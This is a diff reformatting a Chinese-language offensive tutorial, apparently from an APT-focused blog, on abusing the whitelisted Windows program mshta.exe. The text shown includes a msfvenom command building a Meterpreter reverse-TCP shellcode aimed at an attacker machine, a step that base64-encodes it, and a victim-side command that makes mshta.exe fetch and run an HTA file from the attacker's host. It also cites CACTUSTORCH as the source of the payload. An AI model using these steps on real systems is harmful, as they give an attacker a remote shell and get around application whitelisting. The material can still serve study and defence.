@@ -1,7 +1,5 @@
-# 专注APT攻击与防御
-https://micropoor.blogspot.com/
-
-**Mshta简介：**
+  
+### Mshta简介：
 
 Mshta.exe是微软Windows操作系统相关程序，英文全称Microsoft HTML Application，可翻译为微软超文本标记语言应用，用于执行.HTA文件。
 
@@ -10,34 +8,42 @@ Mshta.exe是微软Windows操作系统相关程序，英文全称Microsoft HTML A
 基于白名单Mshta.exe配置payload：
 
 Windows 7 默认位置：
-`C:\Windows\System32\mshta.exe
-C:\Windows\SysWOW64\mshta.exe`
+```bash
+C:\Windows\System32\mshta.exe
+C:\Windows\SysWOW64\mshta.exe
+```
 
 
-**攻击机：**192.168.1.4 Debian
+**攻击机：**192.168.1.4 Debian  
 **靶机：** 192.168.1.3 Windows 7
 
-**配置攻击机msf：**
+### 配置攻击机msf：
 ![](media/f245f8669131b9479df5938aeaa46e04.jpg)
 
-**配置payload：**
+### 配置payload：
 
-`msfvenom ‐a x86 ‐‐platform windows ‐p windows/meterpreter/reverse_tcp LHOST=192.168.1.4 LPORT=53 ‐f raw > shellcode.bin`
+```bash
+msfvenom ‐a x86 ‐‐platform windows ‐p windows/meterpreter/reverse_tcp LHOST=192.168.1.4 LPORT=53 ‐f raw > shellcode.bin
+```
 ![](media/bb0de086b8d214f602a32b1e969bf8e3.jpg)
 
-`cat shellcode.bin |base64 ‐w 0`
+```bash
+cat shellcode.bin |base64 ‐w 0
+```
 ![](media/a082e7172c33c803848cbb3137e0350a.jpg)
 
-替换如下：
+替换如下：  
 ![](media/db40efa36fb44a78de6ad92e0703e070.jpg)
 
-**靶机执行：**
+### 靶机执行：
 
-`mshta.exe http://192.168.1.4/Micropoor.hta`
+```bash
+mshta.exe http://192.168.1.4/Micropoor.hta
+```
 
 ![](media/555b1ac76b6f56f92f49c6bda5e8f91f.jpg)
 
-## 附录：Micropoor.hta
+### 附录：Micropoor.hta
 **注：x86 payload**
 ```VBScript
 <script language="VBScript"> 
@@ -285,7 +291,7 @@ self.close
 </script> 
 ```
 
-**来源：**
+**来源：**  
 https://raw.githubusercontent.com/mdsecactivebreach/CACTUSTORCH/master/CACTUSTORCH.hta
 
 >   Micropoor
